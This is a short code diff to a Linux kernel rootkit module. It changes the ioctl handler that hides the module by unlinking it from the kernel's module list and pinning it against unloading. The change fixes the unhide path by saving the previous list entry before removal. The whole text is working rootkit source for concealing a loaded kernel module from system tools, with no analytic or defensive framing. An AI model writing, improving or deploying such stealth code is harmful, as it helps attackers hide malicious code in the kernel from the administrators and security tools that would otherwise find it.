@@ -35,6 +35,7 @@ static int rootkit_release(struct inode *inode, struct file *filp) {
 }
 
 static bool module_hidden = false; // default : visible (not hidden)
+static struct list_head *prev_entry = NULL;
 
 static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
                           unsigned long arg) {
@@ -45,14 +46,16 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
     switch (ioctl) {
     case IOCTL_MOD_HIDE:
         if (!module_hidden) {
+            prev_entry = THIS_MODULE->list.prev;
+            try_module_get(THIS_MODULE); // Prevent unloading
             // Hide module: remove from list
             list_del(&THIS_MODULE->list);
             module_hidden = true;
-            try_module_get(THIS_MODULE); // Prevent unloading
+            
             printk(KERN_INFO "Module hidden\n");
         } else {
-            // Unhide module: add back to list
-            list_add(&THIS_MODULE->list, THIS_MODULE->list.prev);
+            if (prev_entry)
+                list_add(&THIS_MODULE->list, prev_entry);
             module_hidden = false;
             module_put(THIS_MODULE); // Balance reference count
             printk(KERN_INFO "Module unhidden\n");
